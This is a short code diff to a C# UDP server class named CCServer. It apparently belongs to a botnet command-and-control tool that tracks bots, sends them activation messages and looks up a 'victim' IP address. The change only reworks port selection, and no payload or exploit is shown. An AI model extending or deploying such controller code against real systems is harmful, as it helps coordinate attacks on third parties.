@@ -16,7 +16,6 @@ namespace CC
         static readonly int MAX_SIZE = 256;
         private UdpClient _udpclient;
         private int _listen_port;
-        private int _sending_port;
         private string _ip;
         private readonly string _newline_delimeter = "\r\n";
         private List<Bot> _bots;
@@ -26,19 +25,12 @@ namespace CC
         public CCServer(int listen_port, string ip)
         {
             _listen_port = listen_port;
-            _sending_port = find_free_port();
             _ip = ip;
-            _udpclient = new UdpClient(0);
+            _udpclient = new UdpClient(_listen_port);
             _bots = new List<Bot>();
         }
 
-        public int find_free_port()
-        {
-            UdpClient client_for_port = new UdpClient(0);
-            int port = ((IPEndPoint)client_for_port.Client.LocalEndPoint).Port;
-            client_for_port.Close();
-            return port;
-        }
+        
 
         public void serve()
         {
@@ -83,6 +75,13 @@ namespace CC
                     break;
             }
         }
+        public int find_free_port()
+        {
+            UdpClient client_for_port = new UdpClient(0);
+            int port = ((IPEndPoint)client_for_port.Client.LocalEndPoint).Port;
+            client_for_port.Close();
+            return port;
+        }
 
         private void activate()
         {
@@ -90,8 +89,9 @@ namespace CC
             {
                 foreach (Bot bot in _bots)
                 {
+                    int sending_port = find_free_port();
                     UdpClient client = new UdpClient();
-                    IPEndPoint end_point = new IPEndPoint(IPAddress.Any, _sending_port);
+                    IPEndPoint end_point = new IPEndPoint(IPAddress.Any, sending_port);
                     byte[] data = generate_activate_msg(bot);
                     client.Client.Bind(end_point);
                     client.Send(data, data.Length, bot.get_ip().ToString(), bot.get_port());
@@ -156,7 +156,7 @@ namespace CC
             }
         }
 
-        private IPAddress get_victim_ip_address()
+        public static IPAddress get_victim_ip_address()
         {
             var host = Dns.GetHostEntry(Dns.GetHostName());
             foreach (var ip in host.AddressList) {
